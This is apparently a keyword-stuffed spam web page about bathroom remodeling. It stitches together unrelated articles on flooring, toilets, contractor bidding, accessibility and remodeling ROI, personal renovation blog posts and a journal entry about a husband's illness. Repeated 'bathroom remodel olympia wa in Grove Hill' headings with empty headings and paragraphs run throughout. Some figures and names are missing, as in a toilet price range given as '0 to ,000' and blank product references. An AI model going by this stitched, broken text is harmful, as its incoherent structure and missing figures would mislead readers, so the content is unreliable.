If you find you&#x2019;re out of budget, then you are able to value engineer it by substituting less expensive materials to bring the cost into budget.</p>   <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>   <h2></h2>   <p></p>    <h2>DON&#x2019;T FORGET THE LIGHTING</h2>    <p>&#x201c;Every room needs good lighting, but the kitchen and bathroom are the rooms that need a layered lighting plan. A layered lighting plan covers general lighting, task lighting, and ambient lighting for the multiple purposes of a bathroom.&#x201d;</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <h2>DO YOUR RESEARCH</h2>    <p>&#x201c;You do not want to date yourself on a brand new remodel by putting in last year&#x2019;s trends, so stay on top of the latest products and technologies for the bathroom. One of the good things about using a professional designer is they are in the know on the latest looks and will bring them to you.&#x201d;</p>    <h2>BE PREPARED FOR BIDDING</h2>    <p>&#x201c;I recommend bidding with three different builders or subcontractors so you can get a good picture of what the bids should be. And remember, the lowest bid is not always the right one.&#x201d;</p>    <h2>ASK FOR REFERENCES</h2>    <p>&#x201c;A full bathroom remodel takes about three months to complete in full, so you want to make sure that you pick the right contractor to work with. I always recommend asking for three references before I consider hiring such an important person. And before you meet with anyone, make sure they are licensed and insured.&#x201d;</p>    <p><strong>About Patricia Davis Brown:</strong> Brown knows her way around a bathroom.

   <div>   <p>While there are many factors that effect the appearance of your bathroom remodel, one major component is the flooring you choose. In the past, ceramic tiles have often been the go to choice for homeowners, but with a growing number of flooring options entering the market, you can select a surface that not only strengthens your design choice, but also makes a statement while doing so. Provided below are an assortment of creative flooring options you can include in your bathroom remodel.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <p><strong>Glass&#xa0;</strong></p>   <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>   <h2></h2>   <p></p>    <p>When you think of glass in your bathroom, your mind may go straight to the tiles on your walls, but in actuality, glass is also an excellent material for flooring. It has the ability to fit into almost any bathroom design due to the countless colors and sizes it is offered in. Since glass is not a porous material, cleaning and maintaining the surface is rather easy. You can simply use warm water to wipe the floor down, or if you would prefer a more intense cleaning, you can mix white vinegar into the warm water. Glass has a natural resistance to mildew and mold which makes it perfect for the high moisture levels that exist in bathrooms.</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p><strong>Concrete</strong></p>    <p>If you&#x2019;re looking for a durable floor that resembles the natural look of stone without the high price tag, concrete flooring is your answer. You have the option of staining concrete virtually any color, and you also have the ability to imprint the surface with a decorative design pattern. One draw back of concrete flooring is its need to be sealed. If you don&#x2019;t have the floor sealed properly, it can become stained. Unfortunately, after the first sealing you will need to have the surface resealed every 2 years.</p>    <p><strong>Bamboo</strong></p>    <p>This durable and water resistant flooring creates a warm natural look in your bathroom. Offered in various plank sizes and colors, bamboo will add a touch of luxury and finesse to your bathroom&#x2019;s appearance. While bamboo flooring has a close resemblance to wood flooring, it is a much more eco-friendly substitute to wood due to its fast growth rate.</p>    <p>Stepping away from your average bathroom flooring to select an innovative material, such as, glass, concrete, or bamboo adds a unique twist to your renovation.

   <div>   <p>In January, we started remodeling our front entryway and half bathroom. It all started with the idea of turning our hallway closet into a bench seat and snowballed into completely remolding the entryway closet, hallway and the half bath, which is right off the hallway. With two little ones, this was a big project to take on. I am so thankful for nap time. How they slept though hammering and drilling, I will never know. It is now August and everything is functional, but there are still a few details we have to do before we can say we are finished. But onto the bathroom.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>First, before we moved into our house, we removed the wall paper. If this is something you have never tried, it can be hit or miss depending of the room. One part fabric softener and two parts water, mixed together in a spray bottle, was the solution that we found worked best for our wall paper removal needs. Check out the lovely bathroom wall paper below.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <center>    &#xa0;   </center> After we moved in, we painted the walls gray and lost a knob on our cabinet and a bolt cover on our toilet. Never did find them.   <center>    &#xa0;   </center> Next, once we were ready to take on the ginormous project that is remodeling, came demolition. This is great way to get out all of your aggression. This tile came up really easily and the elimination of that hideous wall paper&#xa0; that was hiding behind the cabinet happened mostly in one, big, ugly chunk. We ousted the medicine cabinet and towel rack. Then, in no time at all, we had attached the backer board to the plywood floor.   <center>    &#xa0;   </center> Then, came the back-breaking hard work of laying new tile and grout.   <center>    &#xa0;   </center> Finally, we painted, added trim, and installed the new porcelain throne and pedestal sink.   <p>Remodeling, is hard work but so gratifying.

   <div>   <p>OK, this one has been a long time in the making. Nikki and I have lived in our house for almost 3 years now. It will be 3 year in February (we can&#x2019;t beleive it&#x2026;). When we moved in we painted every room in the house a new color as we weren&#x2019;t too fond of the previous owners decorating choices. The only room we didn&#x2019;t touch was the downstairs half bath. We&#x2019;d always wanted to do something to it, and over time we picked up ideas along the way. When we originally painted the house I was chalkboard and magnetic paint and thought they could be interesting&#x2026; Months later we happened to walk down the tile isle at home cheapo and saw some cool black and white tiles on close out (and only 2 boxes) so we picked those up too. Once thing led to another and a few weeks (months even) ago I tore into the downstairs half bath&#x2026;</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Here&#x2019;s what I did:</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <ul>    <li>Removed toilet/sink</li>    <li>removed old vanity</li>    <li>patched hole where old vanity was</li>    <li>painted top half of walls with 3~4 coats of magnetic paint</li>    <li>painted top half of walls with chalkboard paint</li>    <li>painted ceiling</li>    <li>installed crown molding</li>    <li>installed new vanity</li>    <li>tiled floor</li>    <li>installed beadboard</li>    <li>painted beadboard</li>    <li>installed new low flow toilet (it actually flushes better than the old one!)</li>    <li>reused sink, but with new &#x201c;chrome&#x201d; faucet</li>   </ul>   <p>I think that covers it. We both LOVE the new look. The only thing we have left is to find a simple blind we like for the back window, but the window is high enough you can&#x2019;t see right in. If I were standing up and someone my height were on the deck, they&#x2019;d see my chest and head, so it&#x2019;s no huge deal. We&#x2019;re also hoping the chalkboard walls will make people sitdown and have some fun, so less mess. Enjoy the shots, as we had a blast doing this. We&#x2019;re planning on making it a mini photo gallery as well as collect anything funny anyone has to put up.

   <div>   <p>We&#x2019;re currently mid-remodel on our&#x201d;master&#x201d; bathroom here in the big Day Coming household. Last week, I was out in Silicon Valley California for a business trip, so when I returned Friday my father and I set up Saturday as another bathroom remodel working day. We&#x2019;re trying to get as much work done on free days as we can before he and my mother head south for the winter. Here&#x2019;s hoping we have a sustained Indian Summer to keep them up here longer&#x2026; Our last working day turned out to be rather unproductive. We used the wrong couplers to join copper and PVC drains and had to cut them out and start over. We spent more time at plumbing supply and home improvement stores than we did getting things done, but we did manage to plumb the trickiest section of the drain. So lesson learned the hard way &#x2013; you can use Fernco rubber couplers to join copper and PVC &#x2013; just be sure to use &#x201c;shielded&#x201d; ones (a metal sheathing wraps on the outside of the rubber, but under the clamps) when you won&#x2019;t have access to them after they&#x2019;re installed (i.e. they&#x2019;re under a floor or in a wall that you don&#x2019;t have an access panel). So we used couplers that cost 1/10th the cost of the original heavy-duty push fit couplers I bought online &#x2013; a costly lesson!</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>This past Saturday we had much better results. We spent a good hour getting what we needed in the morning, but we were able to work the rest of the day without any hiccups. We finished plumbing the new shower up to and including the trap. We got the new vanity&#x2019;s drain and supply lines plumbed. We converted copper to PVC on the toilet drain so we can make the flange level with the floor (the original owner had all the toilets on pedestals!). I even snuck in a quick capping of the old supply lines yesterday between halves (watching my Giants get clobbered).</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <dl>     <dd>      Vanity and shower drain wye     </dd>    </dl>    <dl>     <dd>      Toilet flange     </dd>    </dl>    <dl>     <dd>      New vanity plumbing     </dd>    </dl>   </div>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3>Related posts:</h3>   </div>  </div>

   <div>   <h2>The Best Toilet For Remodeling A Small Bathroom</h2>   <p><strong>Author: </strong></p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>It wasn&#x2019;t that long ago that there were really only two choices about the toilet installed when a bathroom was remodeled. Those choices were about color and the shape of the bowl (round or oval). Things are very different today. The toilet has as much decorative importance as the tub or the vanity. Here are some things to consider as you explore the overwhelming number of choices before you.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Space is probably the first consideration in choosing any fixtures, fittings and cabinets for a small bathroom. You will certainly want the toilet to either match or coordinate with the sink and the tub or shower. The overall d&#xe9;cor of the bathroom will shape you choices of color, material, size, shape and type of installation. You will find variety and directly competing products. This means you will probably spend some time on choosing the best toilet for remodeling your small bathroom.&#xa0; Here are some other things to consider.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&#xa0;1. Price. Although toilet prices range from as little as 0 to ,000, you don&#x2019;t need to spend a huge amount on this fixture. Things like special installations, lavish decoration, color, special shape or special features will increase the price. It will help you make smart choices if you establish a budget and prioritize the features that could add cost before you go shopping.</p>   <p>2. Style and Shape. You will need to choose between styles with the traditional two-piece construction or just a bowl. You can choose a low-profile tank or the standard taller tank. What shape bowl do you want? The round bowl styles are usually preferred in smaller bathrooms and for their lower cost.</p>   <p>3. Seat height. This decision will probably be based on the people who will use the remodeled bathroom. In most cases, you will choose the standard height. For young children, however, you might prefer a low-profile model that has the seat lower than usual. And for an older person or someone with a disability, you might want to choose a style that has a seat two or three inches higher than the standard.</p>   <p>4. Water use. If water conservation is important to you or is required where you live, you will probably want to shop for the model that uses the smallest amount of water for a flush. Some of the new models work efficiently using only about one-fourth the amount of water as older models. These designs will also have smaller tanks (making them a better fit in small bathrooms). You can also consider a dual-flush toilet. These styles provide a light flush that uses a minimal amount of water, or a more powerful flush when needed. They are operated by either pushing a button or using a lever. It will be a good idea to try the mechanism before you buy because the push button types can be difficult for some people to operate.</p>   <p>5. Flushing mechanism. Toilets flush in one of two ways. A gravity flush model, which is most commonly seen in residential bathrooms, uses the water stored in the tank and gravity forces the water into the bowl and out. A pressure-assisted flush (which is becoming increasingly popular in homes) model uses pressure in the supply pipe to compress air, which exerts great force on a small amount of water to clear the bowl. The pressure flush toilet will be more difficult to install and to repair, it will cost more, and it will be noisier. If you whose a pressure flush toilet, you might want to invest in soundboard on the interior walls.</p>   <p>&#xa0;6. Features. New options and features seem to become available often. You can choose the old Victorian style toilet with a tank mounted high on the wall and a pull chain. There are toilet seats that close slowly and quietly when touched. Some toilets have a bidet built in, or you can buy a bidet insert.</p>   <p>If you take the time to think about all of your options when buying a toilet, you will be able to select a model that is sized appropriately for a , matches the rest of the bathroom d&#xe9;cor, and fits your budget.</p>   <p>Copyright 2010 by Dan Fritschen</p>   <p>Article Source: </p>   <p><strong>About the Author</strong></p>   <p>Dan Fritschen is an internationally recognized remodeling expert and the author of seven books on remodeling.

Consumers today are bombarded with advertisements that claim kitchen remodel costs that are unrealistic and usually those low cost offers don&#x2019;t measure up to the customers&#x2019; expectations.

   <div>   <div>    Journal Entry July 4, 2011   </div>   <div>    It officially took over three weeks to remodel the kids&#x2019; bathroom! Ross and I decided to remodel because we would be selling the house in the next few years. Unfortunately, we were trying to get everything done as inexpensively as possible and asked a family friend, Darrel, to help out. He had offered to help with anything we needed and was more than happy to help. However, he had a construction business, and was only able to work between jobs. This did not work well with Ross.   </div>   <p>The reason I say that is because Ross could not stay out of that bathroom &#x2026; and I mean he could not just let the job sit waiting for Darrel. Darrel was well aware of Ross&#x2019; condition and had told him to leave the work for him. Ross could not tolerate something sitting undone; especially when he &#x201c;could knock a job like that out in just a few days.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>It was very difficult and even more difficult to watch him. When I was not paying attention, he would go into that room and work. He was even sanding, with dust flying all around him; and that is when I made the decision that I cannot help him help himself. He knows what he is doing and not doing to take care of himself and I have to just let it go. I told him that my nagging was because I care and want him to do everything to sustain his life as long as possible. I told him there is nothing more I can do &#x2026; he needed to face the consequences of his choices.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>After much frustration the bathroom was finally complete; however, Ross had continued to work on tearing out the floor, dry wall plastering and sanding, plumbing, priming, painting, baseboards, and the shower door.&#xa0;When the bathroom remodel was complete, I asked him if he felt better and he said he did. However, his mood did not improve. Ross just continued to comment that the remodel would not have been finished if he had not pushed himself to do it. It makes me feel sad that he truly thought that, but I had to let it go.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>I speculated that he may have felt with all the bad news lately, there was little hope and to push himself to continue even though it put a strain on his heart. Or he could have felt he was actually improving with the medication he was taking including the prednisone. Either way I could not seem to reason with him to let it go.</p>   <p>Everything was at a lull while we waited for Dr. Ferries to find a program that would consider the lung transplant with RIMA and LIMA heart bypass grafting. Hopefully, someone had either done such a procedure or was willing to attempt it. Ross was at the point where he did not need a transplant right away; but he was becoming increasingly ill.&#xa0;I decorated the new bathroom; but it meant nothing. I would rather have had a healthy Ross.</p>  </div>

   <div>   <p>In my last post I showed two recent projects &#x2013; one a medium size addition, and the other a new backyard cottage. Here I&#x2019;ll focus on a very small project, a bathroom remodel in the Queen Anne neighborhood.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The existing bathroom was functional, but just barely so. The built-in tub was tucked into a niche,&#xa0; under a vaulted ceiling that required the homeowners to crouch down to take a shower. The toilet was located behind a too-big vanity, which protruded into the doorway (the door actually had to open out into the hallway). The goal in the project was to improve the configuration and functionality, introduce some more refined finishes, and do so in a cost-effective fashion.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&#xa0;</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The door opening was moved away from the sink, and the door was re-used as a custom (i.e. substantial) pocket door. The toilet was moved into the vaulted space, because its function allowed it to work well with the lower ceiling there. The tub was moved around the corner, to give it more headroom and bring it more natural light. The new clawfoot tub allows the tile floor to run underneath, and makes the room feel more spacious. Its ring curtain allows the window to be open to the room, but provide privacy when in use. The pedestal sink is set away from the door, and allows easier access into the room. A pedestal was chosen to, again, let the tile floor run underneath and keep the room feeling bigger.</p>   <p>There&#x2019;s an interesting mix of traditional (the clawfoot tub) and modern (the pedestal sink and toilet) fixtures, which are tied together by similar colors and hardware, and complement each other nicely.</p>   <p>A painted beadboard wainscot wraps the room and connects everything together. Its cap aligns with the window sill, and extends out at the sink wall to provide shallow shelf space, for toiletries, display items etc. A new mirrored medicine cabinet adds more storage, and is worked into the design of the sink and shelf.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>We also took the opportunity, once the walls were opened up, to add insulation, do some air-sealing, upgrade the existing plumbing and electrical, and make some structural improvements.</p>  </div>

   <div>   <p>Have you been postponing the bathroom remodeling for long? Is it because of the high cost associated with it? There is no need to postpone what you have to take up ultimately. Bathroom remodeling is definitely a big job. This is why you should plan everything carefully before embarking on the project.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>My first advice is, even with your experienced DIY knowledge do not take up the job of bathroom remodeling by yourself.

Once you are done, you are all set to begin the remodeling work of your bathroom.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The first step is to get a good contractor for the job.

When you are trying to finalize the deal, get estimates from a number of professional service providers. Make thorough background check of their experience and earlier work. You must remember to check their certifications and insurance covers as well. Once you are through, you will have a choice in hand. In general people do not bargain with plumbing and remodeling service providers, but you should ask for a detailed cost estimate and try to get the job within your budget. Do not try to lower the rate too much as this will result in negligence in work and sub-standard output. The duration of the project might also get elongated due to negligence.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>The next step is to jot down the issues within your bathroom. The most important changes needs to be listed and must be done at all cost. If there are any other miscellaneous changes that you wish to make, mainly for the decorative purposes, do list them too. However, in case of cost crunch, let go of these changes.</p>   <p>Get the best equipment from the market. They might cost somewhat more, but you will be saved the trouble of repairing faulty parts from time to time. Functionality is the keyword. You should choose the fittings that go best with your day to day schedule and the interior look of the bathroom.</p>   <p>While selecting , it is best to do that by yourself. Do not leave the job to the contractors. They do not know about your choice. Also, this will allow you to select the best products at most reasonable rates. Make sure you have checked multiple stores before finally buying the bathroom fittings.</p>   <p>In places like Canada, where the temperature can go down considerably during the colder months, it is best to opt for fittings that can withstand extreme high and extreme low temperatures. Remember never opt for sub-standard items just to save a few bucks. It is your bathroom and you should always choose the best for it. Go for as it has the highest ratings among all the other companies.</p>  </div>

Whether you&#x2019;re excited at the idea of creating a new look that will add value to your home, or simply relieved that you&#x2019;ll no longer have to look at dated fixtures and cracked tile, you&#x2019;ll be facing a lot of decisions about materials, colors, fixtures, flooring and more.

The guide says homeowners should begin by considering five key points:</p>   <p><strong>1. Consider how you will use the space and allow it to guide your renovation plans.</strong> Do you want your bathroom to be a spa-like retreat for the masters of the house? Or is it more important that the room be able to handle more intense use from the whole family? Gather input from everyone who will use the room, and evaluate what&#x2019;s already present that works &#x2013; and what doesn&#x2019;t.</p>   <p><strong>2. Will you hire a professional or attempt to do the job yourself?</strong> While DIYers may save on labor costs, professional designers and licensed contractors may be better able to help you maximize your space and stay on budget. Ultimately, hiring professionals may save you time and money.</p>   <p><strong>3. Measure &#x2013; everything!</strong> Nothing&#x2019;s worse than falling in love with a vanity or jetted tub only to find neither fits in the space you have for it. Before you begin shopping, determine how much space your bathroom has for key fixtures such as the sink, toilet, shower and furniture. And mentioning tubs &#x2013; be sure the one you choose will fit through the bathroom door before you buy it.</p>   <p><strong>4. Get educated before heading to the store or showroom.</strong> Compare products and prices and check out product reviews. Decide what materials to look for and identify how you want installations to be done.</p>   <p><strong>5. Set a budget and establish priorities.</strong> A professional can help you best determine how to achieve your objectives within the framework of your budget. Remember to allow yourself a budget cushion in case surprises crop up during the process &#x2013; and they almost always do.</p>   <p>For more ideas and information on shopping for bathroom renovation products, download the free e-book at www.americanstandard-us.com/promotions/ebook.</p>  </div>  
   <div>   <p>When it comes to bathroom remodeling, don&#x2019;t let a small space fool you into thinking you can put less planning into the project. A great bathroom, especially one that guests will use, requires a well thought-out plan. If you&#x2019;re thinking about taking your bathroom to the next level, here are some common mistakes to think about before you start taking down shower tiles or rip out the vanity:</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <ol>    <li><strong>Keeping the Layout </strong>You don&#x2019;t have to keep the layout of your existing bathroom. One of the greatest things about remodeling is that room designs can completely change. Don&#x2019;t be afraid to move the toilet or vanity if it will work better in a different location. The extra money you spend on plumbing is well worth the expense if your bathroom functions properly. </li>   </ol>   <ol>    <li><strong>Eliminating Natural Light </strong>Privacy is the number one concern in a bathroom. But, privacy doesn&#x2019;t have to mean eliminating all of the natural light in the room. Windows are the obvious choice for natural light, however keeping them in bathrooms can be cause for concern. Consider a skylight, stained glass window or even a glass block window, all of which bring in light without causing privacy issues.</li>   </ol>   <ol>    <li><strong>No Storage </strong>One of the biggest mistakes people make when remodeling their bathrooms is not planning for storage. The more storage, the better! Medicine cabinets, shelves, vanities and closets are a great way to add style and function to your bathroom and decrease the clutter that accumulates on countertops or in organizers throughout the room. </li>   </ol>   <ol>    <li><strong>Placing the Toilet Next to the Door </strong>No one wants to walk right into the toilet when they walk into the bathroom. Not only is it awkward, but it also limits the traffic flow in and out of the room. While you&#x2019;re planning your bathroom remodel, plan to put the toilet as far away from the door as possible. This will increase the functionality of the room and also make the space seem less crowded.</li>   </ol>   <ol>    <li><strong>Room for One </strong>In many homes, bathrooms are used by more than one person at a time. While one showers, the other brushes their teeth. Make sure there&#x2019;s enough room in the space for two people to comfortably fit. If there&#x2019;s room, design the space to accommodate two sinks and extra countertop surfaces.</li>   </ol>   <p>If you&#x2019;re considering a bathroom makeover and need some help with plans and designs, stop into the Firenza Stone today.

   <div>   <div>    <h1>Sammamish Age-in-Place Bathroom Conversion</h1>   </div>   <div>    By David Boller, on February 1st, 2011   </div>   <div>    <p>A retired couple in Sammamish wanted to convert the bathroom to accommodate their age-in-place lifestyle and to refresh the bathroom look. This was the first bathroom remodel since the home had been built. The bathtub was replaced with a large cultured granite walk-in shower complete with appropriate Moen hand holds and sitting area. The laminate flooring provided a tile appearance for an economical price.</p>   <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>   <h2></h2>   <p></p>   </div>  </div>

   <div>   <p>Billions and billions and billions of dollars. That&#x2019;s what Americans spent on home remodeling in 2015. More like hundreds of billions. And 2016 is fully expected to continue that trend. Major renovations and significant additions to a home are key factors in why that figure is so astronomical! But, if we&#x2019;re all honest, remodeling is the type of project we all consider doing or want to do. According to the National Association of Remodeling Industry (NARI), around 50% of homeowners surveyed in suburban and urban areas say they are willing to remodel their living space, and over two thirds of rural home owners convey that willingness. While a third of all home owners consider it easier to just move to a new home than tackle a remodeling project.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>People remodel for many reasons, and 75% of us report feeling a <strong>major sense of accomplishment</strong> as a result of a completed project. Better functionality and livability, or what we will refer to as the <strong>&#x2018;enjoyment factor&#x2019;</strong>, is generally cited as the top reason for why remodel at all. Other factors like knowing better materials are in place, appreciating the beauty of an upgrade and making changes to fit the owner&#x2019;s feeling of their living space are considerable factors. But it is the joy factor that we wish to emphasize.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Above that however is the overall cost value. Also known as ROI, or return on investment, this factor is our primary consideration. Money spent for home improvement is usually seen as an investment that is recouped at the time of sale. For our purposes, it works out best to understand that as if the home is being sold within a year of a remodeling project. Yet, certain improvements have lasting value, of more than 1 year. So longevity is certainly a consideration for all home remodeling considerations.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Our top list is intended to be easy to read, simple to understand and intending to provide advice should you be considering any of these projects going forward. Or perhaps you are wondering which one(s) may be better to tackle than others. As this isn&#x2019;t the only list of its kind, we chose to go about things a bit differently than others. Here is the basic scale of what into which items made our list and the order in which they appear:</p>   <p>Cost value (or ROI) is the most weighted factor. A few items on the list will actually return more in terms of recouped value than what you, the owner, put into it. Pretty sweet, huh? Unlike some other lists, we&#x2019;d rather not overwhelm you with a long list of percentage points and so instead we go with a scale of:</p>   <p>100% or higher ROI = Supreme (cost value)</p>   <p>90% to 99% = Great</p>   <p>75% to 89% = Very Good</p>   <p>67% to 74% = Good</p>   <p>Anything lower than a return of two thirds the cost you put into it, was not good enough for our list.</p>   <p>Enjoyment Factor is second highest consideration. This is the element that makes homeowners want to be in their home environment more as a result of the completed project. NARI and other organizations will survey homeowners periodically to check on such data and ours comes from December 2015, or later. This scale is:</p>   <p>100% = Top Notch (rare, but it happens)</p>   <p>95% or higher = Great</p>   <p>90% to 94% = Very Good</p>   <p>80% to 89% = Good</p>   <p>Curb Appeal is what prospective buyers are going to notice about a home from the street. If the home upgrade is an item that fits into this category, we decided it deserves to be considered third highest factor in terms of overall value. This is essentially a yay or nay type notation.</p>   <p>Energy Efficiency is a trending item in recent years and 2016 is certainly continuing on that trajectory. Some items on our list have very little to no impact on energy savings, but most do. This is the 4th most important factor we make note of.</p>   <p>Cost &#x2013; inexpensive (lowest) to very expensive (highest) is something we chose to make note of as a factor that at least some owners would wish to consider. As cost value is already being considered, and most weighted, we decided to keep this as the lowest factor, while still realizing for some homeowners, it may be what is most doable for them.</p>   <p>We&#x2019;ll also make notes regarding what each project entails, the longevity you can expect from completion of the upgrade, alternatives to the entry on our list, and some advice from us in how to implement the project or weighing of pros and cons among the entry item and its alternative(s).</p>   <p>An added note regarding cost. The ROI is our primary focus, as this means whatever the cost you actually spend on materials and labor, is what you can hope to get back at time of sale, but this does assume the sale is done relatively soon after the job is completed (generally within a year). We also indicate a cost range and median pricing point, or national average for the remodeling project. There are many factors that go into pricing any job and so the averages are likely best taken with a grain of salt, which is why the range is meant to provide a decent estimate of what is low and high end for the costs. This assumes a professional contractor is in charge of the project, and in general it assumes the house is around 2000 square feet. Where applicable, we all add in a price per sq. ft., which ought to help with realizing the price you can expect to pay for materials/installation of the work.</p>   <p>For the fun of it, we&#x2019;ll go in reverse order. Our highest value item will be at the end and we&#x2019;ll start with an item that is actually highly coveted by many home buyers. Cue up the gong sound, the top 11 list starts&#x2026;. now.</p>   <p>#11 &#x2013; <b>Major Kitchen Renovation</b></p>   <p> A Marvelous Chef&#x2019;s Kitchen by </p>   <p>Originally, our list was going to be 10 items, but in paraphrasing the wise words of Nigel Tufnel (Spinal Tap), &#x201c;this list is better than the ones by those other blokes, because this one goes to eleven.&#x201d; Actually, it goes to eleven for another reason, as a is the third highest item on our list in terms of enjoyment factor. Usually, when any homeowner considers a first project for improving their living space, the kitchen is most desired. It is also the type of remodeling that prospective owners report as top consideration for what they look for inside a home; a well designed kitchen with all the modern conveniences.</p>   <p>The alternative to this project is a minor kitchen upgrade. The difference between the two is the renovation will physically change the design of the room, whereas minor upgrade will not. Both will address and refinish any surface in the room that needs a makeover. And both projects will likely replace older fixtures and appliances with up to date, energy efficient products. With a room redesign comes additional energy efficiency concerns that any professional home designer is fully taking into account. The complete renovation though is overall more costly, and is tied with most expensive item on our list (see #9). A minor upgrade, if truly an upgrade and not just a superficial upgrade is going to cost about half the total price of a major renovation, or at a median price point of around $30,000 (for upgrade).</p>   <p>ROI = Good</p>   <p>Enjoyment Factor = Great</p>   <p>Curb Appeal = Not Applicable (N/A)</p>   <p>Energy Efficiency = Yes, but minor</p>   <p>Cost factor = Very Expensive</p>   <p>Cost range / median price = $50,000 to $80,000 / $60,000</p>   <p>Cost per sq.ft. = Not available</p>   <p>Longevity = 20 years or more before minor upgrade would be considered</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>

Independence in the bathroom can be maintained so do not think that the bathroom cannot stay contemporary when adapted for easy mobility. If searching for an easy accessible bathroom product for a loved one or yourself, it may be useful to keep certain bathroom products in mind.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>&#xa0;</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The most popular way to enhance easy access in any bathroom is too replace the bath. Walk in enclosures with bespoke shower trays are the next best thing. Walk in Enclosures are a simple way to provide a spacious washing area. The ranges of sizes available on the market are perfect to replace a standard bath size of 1700 x 700mm and smaller sizes if you wish to downsize. If you are opting for a wet room then a glass shower panel is another clever method of creating your very own bespoke enclosure. The panels are great for wheelchair access as there are flexible sizes available. One straight panel will give your bathroom a modern feel whilst reflecting light around the room. The panels can be used in conjunction with or without an end panel depending on your personal requirements. The shower tray to use with the panel may be a concern as the standard 80mm in height may be too high. If this is an issue for yourself then maybe consider a designer low profile tray which will half the standard height to just 40mm. This shower tray may be of use to you when suffering from medical issues that affect your mobility. A glass panel is great when cleaning becomes an issue as there are no hidden corners. The height of the panels means that cleaning can be undertaken quite easily in comparison to a traditional bath which means a lot of bending and twisting. Many people like a bath because it gives them a chance to relax and unwind. If you are getting rid of the bath and worry about standing for a long amount of time then purchase a shower seat to compromise. Attaching to the wall it can be placed anywhere inside the enclosure or wet room, so you have the best of both. The products and slippery surfaces produced in the bathroom can be quite daunting; so consider installing a grab rail for support to put your mind at rest. In terms of bathroom suites try to obtain suites that have higher height WC&#x2019;s and wall hung basins. Look out for bathroom taps with single levers which are easier to operate rather than the traditional design.</p>   <p>&#xa0;</p>   <p>Although everyone&#x2019;s individual needs are different these are just a few simple products which may help your bathroom to be more accessible for you to enjoy your time spent in your bathroom.</p>   <p>Article Source: </p>   <p><strong>About the Author</strong></p>   <p>WDBathrooms is an internet based company supplying disocunted products at unbeatable value throughout the UK. www.wdbathrooms.co.uk</p>  </div>

In Peter Langmaid&#x2019;s case, a dormer addition and main floor remodel to his family&#x2019;s home encompassed about two-thirds of his living space. All of the existing bathrooms were affected, and the kitchen was completely remodeled. He chose to move his family to a rental, which he still considers money very well spent. &#x201c;Remodeling is stressful enough without adding the burden of trying to stay in the house. Had we been here, there would certainly have been added expense working around us.&#x201d;</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>When considering whether to stay or go, consult with your contractor about whether they will add general conditions costs to cover the added expense of having you stay. Things as simple as lengthy daily conversations onsite with homeowners can add up, whether you stay or go.</p>   <p>Gwen Sheridan and her family had stayed at her home on and off through her family&#x2019;s first remodel of some upstairs bathrooms. &#xa0;For the second remodel&#x2013;a major revision the main floor&#x2013;she could clearly imagine all of the rooms she wouldn&#x2019;t be able to use. &#x201c;Not having access to a functional kitchen or a bathroom &#x2014; that was a big factor for us in deciding not to stay in the house.&#x201d; &#xa0;Having a young daughter added to her conviction that their family needed to go. &#x201c;It was hard to imagine how we&#x2019;d work around those logistical problems, particularly with a small child. &#xa0;Moving out for a few months, even with the additional expense, was really the right thing for our family.&#x201d;</p>   <div>    <p>Living without a kitchen would have been tough, so the owner opted to stay away during their remodel</p>   </div>   <p>Other families choose to stay, usually in projects that allow them to keep a few rooms undisturbed and a roof firmly in place. &#xa0;Generally, those families don&#x2019;t have younger children, and a way to easily keep their pets safe. &#x201c;We stayed for a number of reasons including that my home is also my 